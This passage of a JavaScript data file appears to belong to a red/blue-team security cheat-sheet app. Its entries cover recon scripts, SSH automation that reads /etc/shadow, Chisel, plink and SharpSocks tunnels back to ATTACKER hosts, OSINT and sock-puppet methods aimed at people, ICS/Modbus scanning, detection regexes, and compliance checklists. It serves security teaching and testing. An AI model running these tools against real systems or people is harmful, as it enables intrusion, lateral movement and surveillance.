      tags: ['python', 'scripting', 'automation', 'pentest'], command: '# === TCP Port Scanner ===\nimport socket\ndef scan(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        s.connect((host, port))\n        s.close()\n        return True\n    except: return False\n\nfor p in range(1, 1025):\n    if scan("TARGET", p): print(f"Port {p} open")\n\n# === HTTP Directory Brute Force ===\nimport requests\nwith open("wordlist.txt") as f:\n    for word in f:\n        url = f"https://target/{word.strip()}"\n        r = requests.get(url)\n        if r.status_code != 404:\n            print(f"[{r.status_code}] {url}")\n\n# === Hash Cracker ===\nimport hashlib\ndef crack_md5(target_hash, wordlist):\n    with open(wordlist) as f:\n        for word in f:\n            word = word.strip()\n            if hashlib.md5(word.encode()).hexdigest() == target_hash:\n                return word\n    return None\n\n# === Subdomain Enumerator ===\nimport socket\nwith open("subdomains.txt") as f:\n    for sub in f:\n        hostname = f"{sub.strip()}.target.com"\n        try:\n            ip = socket.gethostbyname(hostname)\n            print(f"{hostname} -> {ip}")\n        except: pass\n\n# === Web Scraper (extract links) ===\nfrom bs4 import BeautifulSoup\nimport requests\nsoup = BeautifulSoup(requests.get("https://target").text, "html.parser")\nfor link in soup.find_all("a", href=True):\n    print(link["href"])',
      killchain: 'recon', attack: ['reconnaissance', 'execution'], pyramid: 'tools', owasp: [] },

    { id: 'cron-automation', title: 'Cron & Scheduled Task Automation', team: 'blue', category: 'automation',
      description: 'Schedule security tasks: log rotation, backup, scanning, monitoring with cron and systemd timers.',
      tags: ['cron', 'scheduled-task', 'automation', 'monitoring'],
      commands: {
        linux: '# === Crontab Syntax ===\n# min hour day month weekday command\n# *    *    *   *     *       command\n\n# Edit crontab\ncrontab -e\n\n# === Security Automation Examples ===\n# Daily Nmap scan at 2 AM\n0 2 * * * /usr/bin/nmap -sV -oN /var/log/nmap/daily_$(date +\\%Y\\%m\\%d).txt 192.168.1.0/24\n\n# Hourly log backup\n0 * * * * tar czf /backup/logs_$(date +\\%H).tar.gz /var/log/auth.log /var/log/syslog\n\n# Daily ClamAV scan\n0 3 * * * /usr/bin/clamscan -r /home --log=/var/log/clamav/daily.log\n\n# Monitor for new SUID binaries\n0 */6 * * * find / -perm -4000 -type f 2>/dev/null > /tmp/suid_current && diff /tmp/suid_baseline /tmp/suid_current\n\n# Rotate and compress old logs weekly\n0 0 * * 0 find /var/log -name "*.log" -mtime +30 -exec gzip {} \\;\n\n# === Systemd Timer (modern alternative) ===\n# /etc/systemd/system/security-scan.timer\n# [Timer]\n# OnCalendar=daily\n# Persistent=true\n# [Install]\n# WantedBy=timers.target\nsystemctl enable --now security-scan.timer',
        windows: '# === Task Scheduler via schtasks ===\n# Daily Defender scan at 3 AM\nschtasks /create /tn "DailyDefenderScan" /tr "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -Scan -ScanType 2" /sc daily /st 03:00\n\n# Hourly event log backup\nschtasks /create /tn "EventLogBackup" /tr "wevtutil epl Security C:\\Backups\\Security_%date%.evtx" /sc hourly\n\n# Weekly audit report\nschtasks /create /tn "WeeklyAudit" /tr "powershell -File C:\\Scripts\\audit.ps1" /sc weekly /d SUN /st 02:00\n\n# List scheduled tasks\nschtasks /query /fo TABLE /v | findstr /i "security\\|scan\\|backup"\n\n# Delete task\nschtasks /delete /tn "TaskName" /f'
      },
      killchain: 'actions', attack: ['persistence', 'collection'], pyramid: 'tools', owasp: [] },

    { id: 'expect-automation', title: 'Expect & SSH Automation', team: 'red', category: 'automation',
      description: 'Automate interactive sessions: expect scripts, sshpass, paramiko for mass SSH operations.',
      tags: ['expect', 'ssh', 'automation', 'scripting'], command: '# === sshpass (non-interactive SSH) ===\nsshpass -p "password" ssh user@host "whoami"\nsshpass -p "password" ssh user@host "cat /etc/shadow"\n\n# Mass command execution\nwhile read host; do\n  sshpass -p "pass" ssh -o StrictHostKeyChecking=no user@$host "uname -a"\ndone < hosts.txt\n\n# === Expect Script ===\n#!/usr/bin/expect\nspawn ssh user@target\nexpect "password:"\nsend "P@ssword\\r"\nexpect "\\$"\nsend "whoami\\r"\nexpect "\\$"\nsend "exit\\r"\n\n# === Python Paramiko ===\nimport paramiko\nssh = paramiko.SSHClient()\nssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nssh.connect("target", username="user", password="pass")\nstdin, stdout, stderr = ssh.exec_command("id")\nprint(stdout.read().decode())\nssh.close()\n\n# === Mass execution with Paramiko ===\nhosts = ["10.0.0.1", "10.0.0.2", "10.0.0.3"]\nfor host in hosts:\n    try:\n        ssh.connect(host, username="admin", password="pass", timeout=5)\n        _, out, _ = ssh.exec_command("hostname && uname -a")\n        print(f"{host}: {out.read().decode().strip()}")\n    except Exception as e:\n        print(f"{host}: FAILED - {e}")\n    finally:\n        ssh.close()\n\n# === tmux automation ===\ntmux new-session -d -s pentest\ntmux send-keys -t pentest "nmap -sV target" Enter',
      killchain: 'actions', attack: ['execution', 'lateral-movement'], pyramid: 'tools', owasp: [] },

    { id: 'regex-security', title: 'Security-Focused Regex Patterns', team: 'blue', category: 'automation',
      description: 'Regex patterns for log analysis: IP extraction, credential detection, IOC matching, anomaly hunting.',
      tags: ['regex', 'grep', 'log-analysis', 'patterns'], command: '# === IP Address ===\ngrep -oP "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}" access.log\n\n# === Private IPs ===\ngrep -oP "(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)\\d{1,3}\\.\\d{1,3}" file.txt\n\n# === Email Addresses ===\ngrep -oP "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}" file.txt\n\n# === URLs ===\ngrep -oP "https?://[^\\s<>"]+"\n\n# === Potential Credentials ===\ngrep -iP "(password|passwd|pwd|secret|token|api.?key)\\s*[:=]\\s*\\S+" file.txt\n\n# === Base64 Encoded Strings (min 20 chars) ===\ngrep -oP "[A-Za-z0-9+/]{20,}={0,2}" file.txt\n\n# === Windows Paths ===\ngrep -oP "[A-Z]:\\\\[^\\s:*?"<>|]+" file.txt\n\n# === Hash Detection ===\n# MD5 (32 hex)\ngrep -oP "\\b[a-fA-F0-9]{32}\\b" file.txt\n# SHA1 (40 hex)\ngrep -oP "\\b[a-fA-F0-9]{40}\\b" file.txt\n# SHA256 (64 hex)\ngrep -oP "\\b[a-fA-F0-9]{64}\\b" file.txt\n\n# === CVE Numbers ===\ngrep -oP "CVE-\\d{4}-\\d{4,}" file.txt\n\n# === SQL Injection Patterns (in logs) ===\ngrep -iP "(union\\s+select|or\\s+1\\s*=\\s*1|drop\\s+table|;\\s*--)" access.log\n\n# === XSS Patterns (in logs) ===\ngrep -iP "(<script|javascript:|onerror\\s*=|onload\\s*=)" access.log\n\n# === User-Agent Anomalies ===\ngrep -iP "(sqlmap|nikto|nmap|dirbuster|gobuster|burp)" access.log',
      killchain: 'actions', attack: ['discovery', 'collection'], pyramid: 'artifacts', owasp: ['A03'] },

    // ── Compliance & Audit ───────────────────────────────────
    { id: 'cis-benchmark', title: 'CIS Benchmark Checks', team: 'blue', category: 'compliance',
      description: 'CIS (Center for Internet Security) benchmark checks for Linux, Windows, and cloud hardening.',
      tags: ['cis', 'benchmark', 'hardening', 'compliance'],
      commands: {
        linux: '# === CIS Benchmark — Linux Quick Checks ===\n# 1. Filesystem\n# Verify /tmp is separate partition with noexec\nmount | grep /tmp\n# Should show: nodev,nosuid,noexec\n\n# 2. SSH Hardening\ngrep -E "^(PermitRootLogin|PasswordAuthentication|X11Forwarding|MaxAuthTries)" /etc/ssh/sshd_config\n# Expected: PermitRootLogin no, PasswordAuthentication no, MaxAuthTries 4\n\n# 3. Firewall active\nufw status || iptables -L -n\n\n# 4. No empty passwords\nawk -F: \'($2 == "") {print $1}\' /etc/shadow\n\n# 5. SUID/SGID audit\nfind / -perm /6000 -type f 2>/dev/null\n\n# 6. World-writable files\nfind / -xdev -perm -o+w -type f 2>/dev/null\n\n# 7. Unowned files\nfind / -nouser -o -nogroup 2>/dev/null\n\n# 8. Password policy\ngrep -E "^(PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE)" /etc/login.defs\n\n# === Automated CIS Scan ===\n# Lynis\nsudo lynis audit system\n# OpenSCAP\noscap xccdf eval --profile cis /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml',
        windows: '# === CIS Benchmark — Windows Quick Checks ===\n# 1. Account Lockout Policy\nnet accounts\n# Should show: Lockout threshold 5, Lockout duration 15+\n\n# 2. Password Policy\nnet accounts\n# Min length 14+, complexity enabled\n\n# 3. Audit Policy\nauditpol /get /category:*\n# Should log: Logon, Object Access, Policy Change, Account Management\n\n# 4. Windows Firewall\nnetsh advfirewall show allprofiles | findstr State\n# All profiles: ON\n\n# 5. Guest Account\nnet user Guest | findstr "active"\n# Should be: No\n\n# 6. Remote Desktop\nreg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections\n# Should be: 1 (disabled) unless needed\n\n# 7. SMBv1 disabled\nGet-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n# Should be: Disabled\n\n# === Automated ===\n# Microsoft Security Compliance Toolkit\n# PolicyAnalyzer.exe — compare against baselines'
      },
      killchain: 'actions', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'nist-framework', title: 'NIST CSF Quick Reference', team: 'blue', category: 'compliance',
      description: 'NIST Cybersecurity Framework functions, categories, and practical implementation checklist.',
      tags: ['nist', 'framework', 'compliance', 'governance'], command: '# === NIST CSF 2.0 Functions ===\n# GOVERN (GV) — Establish cybersecurity strategy and policy\n#   - Risk management strategy\n#   - Roles & responsibilities\n#   - Supply chain risk management\n\n# IDENTIFY (ID) — Asset management and risk assessment\n#   - Asset inventory (hardware, software, data)\n#   - Business environment understanding\n#   - Risk assessment and prioritization\n\n# PROTECT (PR) — Safeguards for critical services\n#   - Access control (MFA, least privilege)\n#   - Security awareness training\n#   - Data security (encryption at rest/transit)\n#   - Platform security (hardening, patching)\n\n# DETECT (DE) — Timely discovery of incidents\n#   - Continuous monitoring (SIEM, IDS/IPS)\n#   - Anomaly detection\n#   - Adverse event analysis\n\n# RESPOND (RS) — Actions during an incident\n#   - Incident response plan\n#   - Analysis and triage\n#   - Communication (internal/external)\n#   - Mitigation and containment\n\n# RECOVER (RC) — Restore normal operations\n#   - Recovery planning\n#   - Improvements (lessons learned)\n#   - Communication during recovery\n\n# === Implementation Tiers ===\n# Tier 1: Partial — ad hoc, reactive\n# Tier 2: Risk Informed — some awareness\n# Tier 3: Repeatable — formal policies\n# Tier 4: Adaptive — continuous improvement\n\n# Reference: https://www.nist.gov/cyberframework',
      killchain: 'actions', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'audit-checklist', title: 'Security Audit Checklist', team: 'blue', category: 'compliance',
      description: 'Quick security audit checklist: network, endpoints, identity, data, cloud — key items to verify.',
      tags: ['audit', 'checklist', 'security', 'governance'], command: '# === Network Security ===\n# [ ] Firewall rules reviewed (no any-any rules)\n# [ ] Network segmentation in place\n# [ ] IDS/IPS deployed and monitored\n# [ ] VPN for remote access\n# [ ] DNS filtering / sinkhole\n# [ ] Network monitoring (NetFlow, packet capture)\n\n# === Endpoint Security ===\n# [ ] EDR/AV deployed on all endpoints\n# [ ] OS and software patched (< 30 days)\n# [ ] Full disk encryption enabled\n# [ ] USB device control policy\n# [ ] Application whitelisting\n# [ ] Secure boot enabled\n\n# === Identity & Access ===\n# [ ] MFA enabled for all users\n# [ ] Privileged access management (PAM)\n# [ ] Password policy enforced (14+ chars)\n# [ ] Service accounts inventoried\n# [ ] Regular access reviews (quarterly)\n# [ ] Dormant accounts disabled (90 days)\n\n# === Data Protection ===\n# [ ] Data classification in place\n# [ ] Encryption at rest and in transit\n# [ ] DLP policies configured\n# [ ] Backup strategy (3-2-1 rule)\n# [ ] Backup restoration tested\n# [ ] Sensitive data inventory\n\n# === Incident Response ===\n# [ ] IR plan documented and tested\n# [ ] Playbooks for common scenarios\n# [ ] Contact list current\n# [ ] Log retention (90+ days)\n# [ ] SIEM alerts tuned\n# [ ] Tabletop exercises (annual)\n\n# === Cloud Security ===\n# [ ] CSP security baseline applied\n# [ ] Cloud asset inventory\n# [ ] IAM roles least-privilege\n# [ ] Storage buckets not public\n# [ ] Cloud logging enabled\n# [ ] CSPM tool deployed',
      killchain: 'actions', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'iso27001-controls', title: 'ISO 27001 Key Controls', team: 'blue', category: 'compliance',
      description: 'ISO 27001:2022 Annex A key control domains and practical implementation guidance.',
      tags: ['iso27001', 'controls', 'compliance', 'isms'], command: '# === ISO 27001:2022 — Annex A Control Themes ===\n\n# A.5 Organizational Controls (37 controls)\n# - A.5.1  Policies for information security\n# - A.5.2  Information security roles\n# - A.5.7  Threat intelligence\n# - A.5.23 Cloud services security\n# - A.5.30 ICT readiness for business continuity\n\n# A.6 People Controls (8 controls)\n# - A.6.1  Screening\n# - A.6.3  Information security awareness\n# - A.6.7  Remote working security\n\n# A.7 Physical Controls (14 controls)\n# - A.7.1  Physical security perimeters\n# - A.7.4  Physical security monitoring\n# - A.7.9  Security of off-premises assets\n\n# A.8 Technological Controls (34 controls)\n# - A.8.1  User endpoint devices\n# - A.8.5  Secure authentication\n# - A.8.7  Protection against malware\n# - A.8.8  Management of technical vulnerabilities\n# - A.8.9  Configuration management\n# - A.8.12 Data leakage prevention\n# - A.8.15 Logging\n# - A.8.16 Monitoring activities\n# - A.8.23 Web filtering\n# - A.8.24 Use of cryptography\n# - A.8.25 Secure development lifecycle\n# - A.8.28 Secure coding\n\n# === Statement of Applicability (SoA) ===\n# For each control: Applicable? Implemented? Justification\n# Total: 93 controls in Annex A\n\n# === Certification Process ===\n# Stage 1: Documentation review\n# Stage 2: Implementation audit\n# Surveillance: Annual (years 1-2)\n# Recertification: Every 3 years',
      killchain: 'actions', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    // ── OSINT Expansion ──────────────────────────────────────
    { id: 'osint-social-media', title: 'Social Media OSINT', team: 'red', category: 'osint',
      description: 'Social media intelligence gathering: LinkedIn, Twitter/X, Instagram, Facebook recon.',
      tags: ['osint', 'social-media', 'linkedin', 'recon'], command: '# === LinkedIn ===\n# Search for employees\nsite:linkedin.com/in "target company" "security engineer"\n# Extract employee names for username generation\n# Tools: linkedin2username, CrossLinked\npython3 crosslinked.py -f "{first}.{last}@target.com" "Target Company"\n\n# === Twitter / X ===\n# Advanced search operators\nfrom:@targetuser since:2024-01-01 until:2024-06-01\n"target company" (password OR leak OR hack OR breach)\n# Tools: Twint (archived), snscrape\nsnscrape twitter-search "from:targetuser" > tweets.json\n\n# === Instagram ===\n# Instaloader — download profiles/posts/stories\npip install instaloader\ninstaloader --login=your_user target_profile\ninstaloader --stories target_profile\n\n# === Facebook ===\n# Graph Search (limited):\n# "People who work at Target Company and live in Amsterdam"\n# Tools: fb-sleep-stats, facebook-scraper\n\n# === Username Enumeration ===\n# Sherlock — find accounts across platforms\nsherlock target_username\n\n# Maigret (Sherlock fork, more sites)\nmaigret target_username\n\n# === Email to Social Media ===\n# holehe — check email registrations\nholehe target@email.com\n\n# === Metadata from Posts ===\n# Check EXIF data in uploaded images\n# Photo timestamps, GPS coordinates, device info\nexiftool downloaded_image.jpg',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ttps', owasp: [] },

    { id: 'osint-domain-infra', title: 'Domain & Infrastructure OSINT', team: 'red', category: 'osint',
      description: 'Passive infrastructure recon: DNS history, certificate transparency, WHOIS, Shodan, wayback.',
      tags: ['osint', 'dns', 'certificates', 'infrastructure'], command: '# === Certificate Transparency ===\n# Find subdomains via CT logs\ncurl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r ".[].name_value" | sort -u\n\n# === DNS History ===\n# SecurityTrails (API)\ncurl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" -H "APIKEY: KEY"\n\n# === WHOIS ===\nwhois target.com\n# Check: registrant, name servers, creation date, expiry\n# Reverse WHOIS: find other domains by same registrant\n\n# === Shodan ===\nshodan search "hostname:target.com"\nshodan search "ssl.cert.subject.CN:target.com"\nshodan host TARGET_IP\n# Web: https://www.shodan.io/search?query=org:"Target Corp"\n\n# === Censys ===\n# https://search.censys.io/\n# Search by: IP, domain, certificate, ASN\n\n# === Wayback Machine ===\n# Find old pages, endpoints, config files\ncurl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey" | sort -u\n\n# Waybackurls (Go tool)\nwaybackurls target.com | grep -iE "\\.js$|\\.json$|\\.xml$|\\.env$|\\.bak$"\n\n# === Google Dorks for Infrastructure ===\nsite:target.com filetype:xml\nsite:target.com inurl:admin\nsite:target.com intitle:"index of"\nsite:target.com ext:sql\nsite:target.com ext:env',
      killchain: 'recon', attack: ['reconnaissance', 'resource-development'], pyramid: 'domains', owasp: [] },

    { id: 'osint-breach-data', title: 'Breach & Credential OSINT', team: 'red', category: 'osint',
      description: 'Check for leaked credentials, password dumps, and exposed data from breaches.',
      tags: ['osint', 'breach', 'credentials', 'haveibeenpwned'], command: '# === Have I Been Pwned ===\n# Check email\ncurl -s -H "hibp-api-key: KEY" "https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com"\n\n# Check domain (all breached accounts)\ncurl -s -H "hibp-api-key: KEY" "https://haveibeenpwned.com/api/v3/breacheddomain/target.com"\n\n# === Password in Breach (k-anonymity, no API key needed) ===\n# Hash the password, send first 5 chars\nSHA1=$(echo -n "password123" | sha1sum | awk \'{print toupper($1)}\')\nPREFIX=${SHA1:0:5}\nSUFFIX=${SHA1:5}\ncurl -s "https://api.pwnedpasswords.com/range/$PREFIX" | grep "$SUFFIX"\n\n# === Dehashed ===\n# https://dehashed.com/ (paid)\n# Search by: email, username, IP, name, phone, VIN\n\n# === IntelX ===\n# https://intelx.io/\n# Search: email, domain, IP, phone, bitcoin address\n\n# === Google Dorks for Leaks ===\n"target.com" "password" site:pastebin.com\n"target.com" "password" site:paste.ee\n"@target.com" "password" filetype:txt\n\n# === GitHub Dorks ===\n# Search for exposed secrets\n"target.com" password\n"target.com" api_key\n"target.com" secret\norg:target-org filename:.env\n\n# Tools: truffleHog, gitleaks\ntrufflehog github --org=target-org\ngitleaks detect -s /path/to/repo',
      killchain: 'recon', attack: ['reconnaissance', 'credential-access'], pyramid: 'ips', owasp: [] },

    { id: 'osint-geolocation', title: 'Geolocation & Image OSINT', team: 'red', category: 'osint',
      description: 'Geolocation from images, metadata extraction, satellite imagery, physical location intelligence.',
      tags: ['osint', 'geolocation', 'exif', 'imagery'], command: '# === EXIF Metadata Extraction ===\nexiftool image.jpg\nexiftool -gps* image.jpg          # GPS coordinates only\nexiftool -a -u -g1 image.jpg     # All metadata, grouped\n\n# Batch extract GPS from directory\nexiftool -r -gps* -csv /photos/ > gps_data.csv\n\n# === Remove Metadata (OPSEC) ===\nexiftool -all= image.jpg           # Strip all metadata\nmat2 document.pdf                  # MAT2 for various formats\n\n# === Convert GPS to Map ===\n# Format: DD.DDDD (decimal degrees)\n# Google Maps: https://www.google.com/maps/@LAT,LON,17z\n\n# === Reverse Image Search ===\n# Google Images: images.google.com (drag & drop)\n# TinEye: tineye.com\n# Yandex Images: yandex.com/images (best for faces/locations)\n# Bing Visual Search\n\n# === Geolocation Techniques ===\n# 1. Sun position (shadow direction + length → time + latitude)\n# 2. Language on signs/text\n# 3. Architecture style\n# 4. Vehicle types and license plates\n# 5. Vegetation / terrain\n# 6. Power lines / infrastructure\n# 7. Road markings and driving side\n\n# === Satellite Imagery ===\n# Google Earth Pro (free desktop app)\n# Sentinel Hub: apps.sentinel-hub.com (free satellite data)\n# Mapillary: mapillary.com (street-level imagery)\n\n# === Wi-Fi Geolocation ===\n# Wigle.net: search SSID/BSSID → physical location\n# https://wigle.net/',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ips', owasp: [] },

    { id: 'osint-opsec', title: 'OSINT OPSEC — Stay Anonymous', team: 'red', category: 'osint',
      description: 'Operational security for OSINT: anonymous browsing, sock puppets, VPN/Tor, metadata removal.',
      tags: ['opsec', 'anonymity', 'tor', 'osint'], command: '# === Browser OPSEC ===\n# Use dedicated OSINT browser profile\n# Firefox + extensions: uBlock Origin, NoScript, Cookie AutoDelete\n# Or: Tor Browser for maximum anonymity\n\n# === Tor for CLI tools ===\nsudo apt install tor\n# Configure proxychains\n# /etc/proxychains4.conf: socks5 127.0.0.1 9050\nproxychains curl https://check.torproject.org/api/ip\nproxychains nmap -sT target.com\n\n# === VPN + Tor (double-hop) ===\n# VPN first, then Tor → ISP sees VPN, target sees Tor exit\n\n# === Sock Puppet Accounts ===\n# Use separate identity for OSINT investigations\n# - Dedicated email (ProtonMail)\n# - VPN/Tor for registration\n# - Consistent persona (name, photo, backstory)\n# - Age the account before using\n# - Never mix with personal accounts\n\n# === Metadata Removal ===\nexiftool -all= *.jpg *.png         # Strip image EXIF\nmat2 --inplace document.pdf        # Strip PDF metadata\n\n# === DNS Leak Prevention ===\n# Test: dnsleaktest.com\n# Use DNS-over-HTTPS (DoH) or DNS-over-TLS\n\n# === Verify Anonymity ===\ncurl -s https://ipinfo.io/json     # Check exit IP\ncurl -s https://browserleaks.com/ip # Detailed leak check\n\n# === Virtual Machines ===\n# Use disposable VMs (Tails OS, Whonix)\n# Snapshot before investigation, revert after\n# Never install personal tools in OSINT VM',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ttps', owasp: [] },

    // ── Pivoting & Port Forwarding ───────────────────────────
    { id: 'pivot-ssh-advanced', title: 'SSH Pivoting — Advanced', team: 'red', category: 'pivot',
      description: 'Advanced SSH pivoting: multi-hop, ProxyJump chains, dynamic SOCKS, reverse port forwarding.',
      tags: ['ssh', 'pivoting', 'socks', 'port-forwarding'], command: '# === Local Port Forward ===\n# Access INTERNAL:3306 via PIVOT host\nssh -L 3306:INTERNAL_HOST:3306 user@PIVOT\nmysql -h 127.0.0.1 -P 3306 -u root\n\n# === Dynamic SOCKS Proxy ===\n# Route all traffic through PIVOT\nssh -D 1080 user@PIVOT\n# Configure browser/tools to use SOCKS5 127.0.0.1:1080\nproxychains nmap -sT INTERNAL_NETWORK/24\n\n# === Reverse Port Forward ===\n# Expose INTERNAL service back to ATTACKER\nssh -R 8080:INTERNAL:80 user@ATTACKER\n# Now ATTACKER:8080 → INTERNAL:80\n\n# === ProxyJump (Multi-hop) ===\nssh -J user@PIVOT1,user@PIVOT2 user@FINAL_TARGET\n\n# === SSH Config for Persistent Pivots ===\n# ~/.ssh/config\n# Host pivot1\n#   HostName 10.10.10.1\n#   User admin\n#   DynamicForward 1080\n#\n# Host internal-web\n#   HostName 172.16.0.10\n#   User root\n#   ProxyJump pivot1\n\n# === SSHuttle (VPN over SSH) ===\n# Route entire subnet through SSH\nsshuttle -r user@PIVOT 172.16.0.0/24\nsshuttle -r user@PIVOT 172.16.0.0/24 --dns  # Include DNS\n\n# === ControlMaster (connection reuse) ===\nssh -M -S /tmp/pivot-socket user@PIVOT\nssh -S /tmp/pivot-socket -L 3389:INTERNAL:3389 user@PIVOT',
      killchain: 'actions', attack: ['lateral-movement'], pyramid: 'ttps', owasp: [] },

    { id: 'pivot-chisel', title: 'Chisel & Ligolo — Modern Pivoting', team: 'red', category: 'pivot',
      description: 'Chisel reverse proxy and Ligolo-ng for tunnel pivoting — fast, encrypted, firewall-evasive.',
      tags: ['chisel', 'ligolo', 'pivoting', 'tunnel'], command: '# === Chisel ===\n# Server (attacker)\nchisel server -p 8080 --reverse\n\n# Client (compromised host) — SOCKS proxy\nchisel client ATTACKER:8080 R:1080:socks\n# Now use SOCKS5 on ATTACKER:1080\nproxychains nmap -sT INTERNAL/24\n\n# Client — specific port forward\nchisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306\n\n# Client — multiple forwards\nchisel client ATTACKER:8080 R:3306:DB:3306 R:8443:WEB:443 R:1080:socks\n\n# === Ligolo-ng (recommended for complex pivots) ===\n# Proxy (attacker) — create TUN interface\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Agent (compromised host)\n./agent -connect ATTACKER:11601 -ignore-cert\n\n# In proxy console:\n>> session              # Select session\n>> ifconfig             # Show internal interfaces\n>> start                # Start tunnel\n\n# Add route on attacker\nsudo ip route add 172.16.0.0/24 dev ligolo\n\n# Now directly access internal network\nnmap -sV 172.16.0.0/24\nfirefox http://172.16.0.10\n\n# === Ligolo-ng Double Pivot ===\n# Agent1 on Pivot1 → Agent2 on Pivot2\n# listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601\n# Run agent2 connecting to Pivot1:11601',
      killchain: 'actions', attack: ['lateral-movement', 'command-control'], pyramid: 'tools', owasp: [] },

    { id: 'pivot-windows', title: 'Windows Pivoting Tools', team: 'red', category: 'pivot',
      description: 'Pivot through Windows hosts: netsh portproxy, plink, Invoke-SocksProxy, SharpSocks.',
      tags: ['windows', 'pivoting', 'netsh', 'plink'], command: '# === netsh Port Forwarding ===\n# Forward local port to internal host\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.0.10\n\n# List active port forwards\nnetsh interface portproxy show all\n\n# Remove\nnetsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0\n\n# === Plink (PuTTY CLI) ===\n# Download: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html\n\n# Dynamic SOCKS proxy\nplink.exe -ssh -D 1080 -l user -pw password ATTACKER_IP\n\n# Local port forward\nplink.exe -ssh -L 3306:INTERNAL_DB:3306 -l user -pw password ATTACKER_IP\n\n# Reverse port forward\nplink.exe -ssh -R 8080:127.0.0.1:80 -l user -pw password ATTACKER_IP\n\n# === PowerShell SOCKS Proxy ===\n# Invoke-SocksProxy (PowerSharpPack)\nImport-Module Invoke-SocksProxy.ps1\nInvoke-SocksProxy -bindPort 1080\n\n# === SharpSocks ===\n# C# SOCKS proxy, works through HTTP\n# Server (attacker): SharpSocksServer.exe -c ENCRYPTION_KEY -l https://0.0.0.0:443\n# Client (target): SharpSocksImplant.exe -s https://ATTACKER:443 -c ENCRYPTION_KEY\n\n# === Rpivot ===\n# Server (attacker):\npython server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080\n# Client (target):\npython client.py --server-ip ATTACKER --server-port 9999',
      killchain: 'actions', attack: ['lateral-movement'], pyramid: 'tools', owasp: [] },

    { id: 'pivot-detection', title: 'Pivoting & Tunneling Detection', team: 'blue', category: 'pivot',
      description: 'Detect tunneling and pivoting: SSH tunnels, DNS tunnels, ICMP tunnels, unusual port usage.',
      tags: ['detection', 'tunnel', 'pivoting', 'monitoring'], command: '# === SSH Tunnel Detection ===\n# Long-lived SSH connections with data transfer\nss -tnp | grep ssh | grep ESTAB\n# Unusual SSH connections (workstation → workstation)\n# Splunk: index=network dest_port=22 NOT dest=bastion* | stats count by src, dest\n\n# === DNS Tunnel Detection ===\n# High volume of DNS queries (especially TXT records)\n# Long subdomain names (>50 chars)\n# Splunk: index=dns query_type=TXT | stats count by src | where count > 500\n# Check for iodine/dnscat2 signatures:\n# Unusual number of unique subdomains for single domain\n# Regular interval DNS queries (beaconing)\n\n# === ICMP Tunnel Detection ===\n# Large ICMP packets (>64 bytes data)\n# High volume of ICMP echo/reply\ntcpdump -i eth0 "icmp and length > 100"\n\n# === HTTP Tunnel Detection ===\n# Long-lived HTTP connections\n# Unusual User-Agent strings\n# Regular beacon intervals\n# High volume to single destination\n# Splunk: index=proxy | stats avg(duration) by dest | where avg_duration > 3600\n\n# === Port Forwarding Detection ===\n# netsh portproxy entries on Windows\nnetsh interface portproxy show all\n# Unexpected listening ports\nss -tlnp  # Linux\nnetstat -ano | findstr LISTENING  # Windows\n\n# === Behavioral Indicators ===\n# Process connecting to internal IPs it normally does not\n# Lateral connections on unusual ports\n# Encrypted traffic to internal hosts on non-standard ports\n# Data volume anomalies (exfil via tunnel)',
      killchain: 'actions', attack: ['command-control', 'exfiltration'], pyramid: 'artifacts', owasp: [] },

    // ── ICS/SCADA Security ──────────────────────────────────
    { id: 'ics-recon', title: 'ICS/SCADA Network Reconnaissance', team: 'red', category: 'ics',
      description: 'Discover and fingerprint industrial control systems: Modbus, S7, DNP3, BACnet, EtherNet/IP.',
      tags: ['nmap', 'ics', 'scada', 'modbus', 'plc', 'ot'],
      command: '# === Modbus Discovery (TCP/502) ===\nnmap -Pn -sT -p 502 --script modbus-discover TARGET/24\nnmap -Pn -sT -p 502 --script modbus-discover --script-args modbus-discover.aggressive=true TARGET\n\n# === Siemens S7 (TCP/102) ===\nnmap -Pn -sT -p 102 --script s7-info TARGET/24\n\n# === BACnet (UDP/47808) ===\nnmap -Pn -sU -p 47808 --script bacnet-info TARGET/24\n\n# === EtherNet/IP (TCP/44818) ===\nnmap -Pn -sT -p 44818 --script enip-info TARGET/24\n\n# === DNP3 (TCP/20000) ===\nnmap -Pn -sT -p 20000 --script dnp3-info TARGET/24\n\n# === Shodan ICS Search ===\nshodan search "port:502 modbus"\nshodan search "port:47808 bacnet"\nshodan search "port:102 s7" country:NL\n\n# === Full ICS port scan ===\nnmap -Pn -sT -p 102,502,789,1089,1091,2222,4000,4840,20000,44818,47808 TARGET/24',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'ics-exploit', title: 'ICS Protocol Exploitation', team: 'red', category: 'ics',
      description: 'Interact with and manipulate ICS protocols: read/write Modbus registers, S7 communication.',
      tags: ['modbus', 'plc', 'scada', 'python'],
